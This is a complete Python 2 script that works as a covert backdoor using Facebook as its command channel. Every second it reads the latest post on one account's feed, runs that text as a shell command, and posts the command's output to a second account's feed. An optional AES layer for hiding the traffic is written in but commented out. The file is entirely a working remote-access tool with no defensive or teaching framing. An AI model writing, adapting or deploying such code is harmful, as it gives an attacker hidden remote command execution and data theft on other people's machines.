#!/usr/bin/env python
import sys
import subprocess
import httplib
import urllib
import json
import time
from Crypto.Cipher import AES
from Crypto import Random

def exec_command(command):
    proc = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE,\
	    stdout=subprocess.PIPE)
    return_code = proc.wait()
    out = ""
    err = ""
    for line in proc.stdout:
	out = out + line
    for line in proc.stderr:
	err = err + line
    return (out, err)

userid1 = sys.argv[1]
access_token1 = sys.argv[2]
userid2 = sys.argv[3]
access_token2 = sys.argv[4]

#key = b'lablanquetteestbonnebienbonneoui'
#iv = Random.new().read(AES.block_size)
#cipher = AES.new(key, AES.MODE_CFB, iv)

prev = ""
while 1:
    conn = httplib.HTTPSConnection("graph.facebook.com")
    conn.request("GET", "/" + userid1 + "/feed?access_token=" + access_token1)
    rep =  conn.getresponse()
    json_rep = json.loads(rep.read())
    message_id = json_rep['data'][0]['id']
    if message_id != prev:
	prev = message_id
	command = json_rep['data'][0]['message']
	#command = cipher.decrypt(command)
	(out, err) = exec_command(command)
	result = "out :\n" + out + "err :\n" + err
	#result = iv + cipher.encrypt(result)
	params = urllib.urlencode({'access_token': access_token2,
	    'message':result})
	conn.close()
	conn = httplib.HTTPSConnection("graph.facebook.com")
	conn.request("POST", "/" + userid2+ "/feed", params)
	conn.getresponse()
    conn.close()
    time.sleep(1)
